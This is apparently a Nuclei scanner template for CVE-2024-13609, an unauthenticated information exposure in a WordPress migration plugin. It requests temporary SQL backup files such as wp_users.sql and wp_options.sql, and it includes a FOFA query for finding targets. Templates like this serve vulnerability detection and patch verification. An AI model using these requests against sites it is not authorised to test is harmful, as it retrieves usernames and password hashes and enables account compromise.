id: CVE-2024-13609
info:
  name: 1 Click WordPress Migration Plugin < 2.3 - Unauthenticated Sensitive Information Exposure via Database Backup in class-ocm-backup.php
  author: pussycat0x
  severity: medium
  description: |
    The 1 Click WordPress Migration Plugin â€“ 100% FREE for a limited time plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 2.2 via the class-ocm-backup.php. This makes it possible for unauthenticated attackers to extract sensitive data including usernames and their respective password hashes during a short window of time in which the backup is in process.
  impact:
    Unauthenticated attackers can retrieve sensitive data including usernames and password hashes, risking account compromise.
  remediation:
    Update to the latest version of the plugin where the issue is fixed.
  reference:
    - https://wpscan.com/vulnerability/17fa121a-caa6-46ef-a865-eafd97d86abb/
  metadata:
    verified: true
    max-request: 6
    fofa-query: body="/wp-content/plugins/1-click-migration/"
    vendor: 1-click-migration
    product: 1-click-migration
    framework: wordpress
  tags: cve,cve2024,wpscan,wordpress,wp-plugin,1clickmigration  

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/tmp/db/{{table}}.sql"

    attack: batteringram
    payloads:
      table:
        - "wp_users"
        - "wp_usermeta"
        - "wp_options"
        - "wp_posts"
        - "wp_comments"
        - "wp_postmeta"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "application/sql")'
          - 'contains_all(body,"CREATE TABLE","INSERT INTO","DROP TABLE")'
        condition: and
